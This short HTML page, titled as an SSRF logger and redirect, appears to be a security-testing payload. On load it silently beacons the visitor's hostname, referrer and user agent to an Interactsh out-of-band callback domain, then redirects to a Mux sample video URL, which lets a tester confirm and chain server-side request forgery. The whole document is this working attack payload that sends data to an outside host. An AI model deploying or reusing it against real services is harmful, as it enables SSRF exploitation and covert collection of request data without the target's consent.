<!DOCTYPE html>
<html>
<head>
    <title>SSRF Logger & Redirect</title>
    <script>
        // Function to log the visit and then redirect
        function logAndRedirect() {
            // 1. First, log the visit to Interactsh
            console.log("Logging visit to Interactsh...");
            
            // Use an Image object to make a GET request (works without CORS issues)
            const img = new Image();
            const logUrl = "https://qqbatpnjqjnadljurlznc3gsxop1cg1wy.oast.fun/?visited=" + 
                          encodeURIComponent(window.location.hostname) + 
                          "&referer=" + encodeURIComponent(document.referrer) +
                          "&ua=" + encodeURIComponent(navigator.userAgent) +
                          "&time=" + Date.now();
            img.src = logUrl;
            
            // 2. Then, redirect to the actual video
            console.log("Redirecting to Mux video...");
            window.location.href = "https://static.mux.com/sample-videos/Product.mp4";
        }
        
        // Run the function when the page loads
        window.onload = logAndRedirect;
    </script>
</head>
<body>
    <p>Logging this visit and redirecting to Mux video...</p>
</body>
</html>
